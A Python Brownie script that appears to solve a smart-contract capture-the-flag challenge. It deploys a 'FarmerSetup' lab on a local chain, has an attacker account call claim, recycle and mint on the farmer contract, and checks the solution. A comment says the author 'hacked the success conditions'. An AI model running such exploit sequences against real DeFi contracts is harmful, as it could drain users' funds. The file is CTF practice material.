from brownie import (
    network,
    accounts,
    config,
    interface,
    FarmerSetup,
    CompDaiFarmer,
    CompFaucet
)
from scripts.helpful_scripts import (
    get_account,
    check_solution
)
from web3 import Web3


def main():
    deployer = get_account(index=0)
    attacker = get_account(index=1)

    # setup challenge
    setup = FarmerSetup.deploy({"from": deployer, "value": Web3.toWei(100, 'ether')})
    farmer = CompDaiFarmer.at(setup.farmer())

    # solve challenge
    # it looks like I hacked the success conditions...
    farmer.claim({"from": attacker})
    farmer.recycle({"from": attacker})
    farmer.mint({"from": attacker})
    
    # check the solution
    check_solution(setup)